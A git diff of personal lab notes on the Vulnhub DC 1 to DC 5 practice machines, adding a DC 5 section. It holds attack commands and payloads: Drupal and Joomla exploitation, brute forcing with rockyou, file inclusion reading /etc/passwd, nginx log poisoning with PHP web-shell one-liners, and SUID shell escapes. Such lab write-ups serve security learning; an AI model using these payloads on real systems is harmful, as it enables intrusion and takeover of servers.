@@ -11,7 +11,7 @@ excerpt: "Vulnhub Hacking Boxes..."
 
 ## DC Series Learning...
 
-# dc-1
+# DC 1
 ```bash
 # Exploiting CMS Drupal 7 using msf
 # msf >  search about drupal 7 Exploits and Auxiliaries.
@@ -25,7 +25,7 @@ find . -exec /bin/sh -p \; -quit
 # bling bling !!!
 ```
 
-# dc-2
+# DC 2
 ```bash
 # Exploiting CMS --> Wordpress 4.7.10
 # Password file creation ?
@@ -58,7 +58,7 @@ sudo git help add
 # bling bling !!!
 ```
 
-# dc-3
+# DC 3
 ```bash
 # Exploiting Joomla 3.7.0 Version
  Explore msf usage for joomla exploitation , get used exploit and auxilaries
@@ -85,7 +85,7 @@ nuclei -u $URL -t /root/nuclei-templates/http/cves/ -tags joomla
 # bling bling !!!
 ```
 
-# dc-4
+# DC 4
 ```bash
 - Brute force login pages   --> ffuf , burp , caido 
    * ffuf -request req.txt -request-proto http -w /usr/share/wordlists/rockyou.txt -fs 206
@@ -110,6 +110,35 @@ x --> password placeholder (replace [x] with [no space] for empty pass) => 0xmr:
 pwned user --> User Discription
 /root --> Home Directory of 0xmr
 /bin/bash --> The login shell
+
+# bling bling !!!
+```
+
+# DC 5
+```bash
+# Parameter Fuzzing
+  * ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt  -u http://$IP/thankyou.php?FUZZ=test -e .php,.html,.txt,.js,.json,.xml,.bak,.old,.log -t 50 -fw 30
+
+# Revised [nginx] log poisinging
+http://$IP:$PORT/thankyou.php?file=/etc/passwd
+http://$IP:$PORT/thankyou.php?file=/var/log/nginx/access.log&cmd=id
+
+nc -nv $IP $PORT
+ GET /put_php_code_here
+ 
+ [php codes]:- 
+ <?php passthru($_GET['cmd']); ?>   ===> &cmd=id
+ <?php system($_GET['cmd']); ?>     ===> &cmd=id
+ <?php system($_REQUEST['cmd']); ?> ===> &cmd=id
+ 
+ 
+### Post Expoitation !
+ [SUID or GUID File Extraction]:-
+ SUID==> This allows a file to be executed with the permissions of the file owner.
+ GUID==> This allows a file to be executed with the permissions of the file group.
+ SUID:- find / -perm -u=s -type f 2>/dev/null
+ GUID:- find / -perm -g=s -type f 2>/dev/null
+ 
 
 # bling bling !!!
 ```
